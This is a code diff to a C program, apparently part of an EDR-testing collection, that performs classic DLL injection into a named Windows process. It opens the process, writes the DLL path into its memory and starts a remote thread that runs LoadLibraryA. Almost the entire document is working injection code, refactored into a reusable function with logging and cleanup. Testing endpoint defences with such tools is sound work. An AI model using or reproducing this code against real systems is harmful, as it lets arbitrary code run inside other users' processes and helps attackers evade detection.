@@ -10,111 +10,79 @@
  * For EDR testing purposes only.
  */
 
-#include <windows.h>
-#include <stdio.h>
-#include <tlhelp32.h>
+#include "../common/common.h"
 
-// Function to find process ID by name
-DWORD GetProcessIdByName(const char* processName) {
-    PROCESSENTRY32 pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32);
+/**
+ * Perform classic DLL injection using CreateRemoteThread
+ * 
+ * @param pid Target process ID
+ * @param dllPath Path to the DLL to inject
+ * @return TRUE on success, FALSE on failure
+ */
+BOOL InjectDLL(DWORD pid, const char* dllPath) {
+    HANDLE hProcess = NULL;
+    HANDLE hThread = NULL;
+    LPVOID pRemoteDllPath = NULL;
+    BOOL success = FALSE;
     
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
-        return 0;
+    // Validate DLL path
+    if (!FileExists(dllPath)) {
+        LOG_ERROR("DLL file not found: %s", dllPath);
+        return FALSE;
     }
     
-    DWORD pid = 0;
-    if (Process32First(hSnapshot, &pe32)) {
-        do {
-            if (_stricmp(pe32.szExeFile, processName) == 0) {
-                pid = pe32.th32ProcessID;
-                break;
-            }
-        } while (Process32Next(hSnapshot, &pe32));
-    }
-    
-    CloseHandle(hSnapshot);
-    return pid;
-}
-
-int main(int argc, char* argv[]) {
-    if (argc < 3) {
-        printf("Usage: %s <process_name> <dll_path>\n", argv[0]);
-        printf("Example: %s notepad.exe C:\\\\path\\\\to\\\\your.dll\n", argv[0]);
-        return 1;
-    }
-    
-    const char* processName = argv[1];
-    const char* dllPath = argv[2];
-    
-    printf("[*] Classic DLL Injection Technique\n");
-    printf("[*] Target Process: %s\n", processName);
-    printf("[*] DLL Path: %s\n", dllPath);
-    
-    // Step 1: Get target process ID
-    DWORD pid = GetProcessIdByName(processName);
-    if (pid == 0) {
-        printf("[!] Error: Process '%s' not found\n", processName);
-        return 1;
-    }
-    printf("[+] Found process with PID: %d\n", pid);
-    
-    // Step 2: Open target process with required permissions
-    HANDLE hProcess = OpenProcess(
+    // Open target process with required permissions
+    hProcess = OpenProcess(
         PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
         PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
         FALSE,
         pid
     );
+    CHECK_HANDLE(hProcess, "Failed to open process");
+    LOG_SUCCESS("Process handle obtained");
     
-    if (hProcess == NULL) {
-        printf("[!] Error: Failed to open process. Error: %d\n", GetLastError());
-        return 1;
+    // Verify permissions by attempting a small memory allocation
+    LPVOID testAlloc = VirtualAllocEx(hProcess, NULL, 1, MEM_COMMIT, PAGE_READWRITE);
+    if (testAlloc == NULL) {
+        LOG_ERROR("Insufficient permissions for memory operations in target process");
+        goto cleanup;
     }
-    printf("[+] Process handle obtained\n");
+    VirtualFreeEx(hProcess, testAlloc, 0, MEM_RELEASE);
+    LOG_SUCCESS("Process permissions verified");
     
-    // Step 3: Allocate memory in target process for DLL path
+    // Allocate memory in target process for DLL path
     SIZE_T dllPathSize = strlen(dllPath) + 1;
-    LPVOID pRemoteDllPath = VirtualAllocEx(
+    pRemoteDllPath = VirtualAllocEx(
         hProcess,
         NULL,
         dllPathSize,
         MEM_COMMIT | MEM_RESERVE,
         PAGE_READWRITE
     );
+    CHECK_HANDLE(pRemoteDllPath, "Failed to allocate memory in target process");
+    LOG_SUCCESS("Memory allocated at: 0x%p (%zu bytes)", pRemoteDllPath, dllPathSize);
     
-    if (pRemoteDllPath == NULL) {
-        printf("[!] Error: Failed to allocate memory. Error: %d\n", GetLastError());
-        CloseHandle(hProcess);
-        return 1;
-    }
-    printf("[+] Memory allocated at: 0x%p\n", pRemoteDllPath);
-    
-    // Step 4: Write DLL path to allocated memory
+    // Write DLL path to allocated memory
     SIZE_T bytesWritten;
-    if (!WriteProcessMemory(hProcess, pRemoteDllPath, dllPath, dllPathSize, &bytesWritten)) {
-        printf("[!] Error: Failed to write DLL path. Error: %d\n", GetLastError());
-        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return 1;
-    }
-    printf("[+] DLL path written (%zu bytes)\n", bytesWritten);
+    CHECK_BOOL(
+        WriteProcessMemory(hProcess, pRemoteDllPath, dllPath, dllPathSize, &bytesWritten),
+        "Failed to write DLL path to target process"
+    );
+    LOG_SUCCESS("DLL path written (%zu bytes)", bytesWritten);
     
-    // Step 5: Get address of LoadLibraryA
+    // Get address of LoadLibraryA
     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-    LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
-    
-    if (pLoadLibraryA == NULL) {
-        printf("[!] Error: Failed to get LoadLibraryA address\n");
-        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return 1;
+    if (!hKernel32) {
+        LOG_ERROR("Failed to get kernel32.dll handle");
+        goto cleanup;
     }
-    printf("[+] LoadLibraryA address: 0x%p\n", pLoadLibraryA);
     
-    // Step 6: Create remote thread to execute LoadLibraryA
-    HANDLE hThread = CreateRemoteThread(
+    LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
+    CHECK_HANDLE(pLoadLibraryA, "Failed to get LoadLibraryA address");
+    LOG_SUCCESS("LoadLibraryA address: 0x%p", pLoadLibraryA);
+    
+    // Create remote thread to execute LoadLibraryA
+    hThread = CreateRemoteThread(
         hProcess,
         NULL,
         0,
@@ -123,23 +91,62 @@ int main(int argc, char* argv[]) {
         0,
         NULL
     );
+    CHECK_HANDLE(hThread, "Failed to create remote thread");
+    LOG_SUCCESS("Remote thread created");
     
-    if (hThread == NULL) {
-        printf("[!] Error: Failed to create remote thread. Error: %d\n", GetLastError());
+    // Wait for thread completion
+    LOG_INFO("Waiting for injection to complete...");
+    WaitForSingleObject(hThread, INFINITE);
+    
+    DWORD exitCode;
+    if (GetExitCodeThread(hThread, &exitCode)) {
+        if (exitCode != 0) {
+            LOG_SUCCESS("DLL injection completed successfully (Module handle: 0x%p)", (LPVOID)exitCode);
+            success = TRUE;
+        } else {
+            LOG_ERROR("LoadLibraryA returned NULL - DLL may not have loaded");
+        }
+    }
+    
+cleanup:
+    if (pRemoteDllPath && hProcess) {
         VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
+    }
+    SAFE_CLOSE_HANDLE(hThread);
+    SAFE_CLOSE_HANDLE(hProcess);
+    
+    return success;
+}
+
+int main(int argc, char* argv[]) {
+    if (argc < 3) {
+        PrintUsage(argv[0], 
+                   "<process_name> <dll_path>",
+                   "notepad.exe C:\\\\path\\\\to\\\\your.dll");
         return 1;
     }
-    printf("[+] Remote thread created\n");
     
-    // Step 7: Wait for thread completion
-    WaitForSingleObject(hThread, INFINITE);
-    printf("[+] DLL injection completed successfully\n");
+    const char* processName = argv[1];
+    const char* dllPath = argv[2];
     
-    // Cleanup
-    CloseHandle(hThread);
-    VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
-    CloseHandle(hProcess);
+    LOG_INFO("Classic DLL Injection Technique");
+    LOG_INFO("Target Process: %s", processName);
+    LOG_INFO("DLL Path: %s", dllPath);
+    printf("\n");
     
-    return 0;
+    // Get target process ID
+    DWORD pid = GetProcessIdByName(processName);
+    if (pid == 0) {
+        return 1;
+    }
+    LOG_SUCCESS("Found process with PID: %d\n", pid);
+    
+    // Perform injection
+    if (InjectDLL(pid, dllPath)) {
+        LOG_SUCCESS("Injection process completed");
+        return 0;
+    } else {
+        LOG_ERROR("Injection process failed");
+        return 1;
+    }
 }
